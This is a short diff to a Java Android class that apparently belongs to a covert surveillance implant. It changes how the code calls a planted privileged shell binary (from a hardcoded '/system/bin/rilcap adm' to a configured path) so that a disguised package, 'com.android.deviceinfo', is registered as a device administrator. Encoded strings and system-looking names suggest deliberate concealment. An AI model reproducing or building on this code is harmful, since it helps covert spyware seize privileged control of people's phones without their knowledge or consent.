@@ -235,7 +235,7 @@ public class Core extends Activity implements Runnable {
 				// /system/bin/ntpsvd adm
 				// "com.android.deviceinfo/com.android.deviceinfo.listener.AR"
 				String pack = Status.self().getAppContext().getPackageName();
-				String bd = M.e("/system/bin/rilcap adm");
+				String bd = Configuration.shellFile +  M.e(" adm");
 				String tbe = String.format("%s %s/%s", bd, pack, M.e("com.android.deviceinfo.listener.AR"));
 				// /system/bin/ntpsvd adm
 				// \"com.android.networking/com.android.networking.listener.AR\"
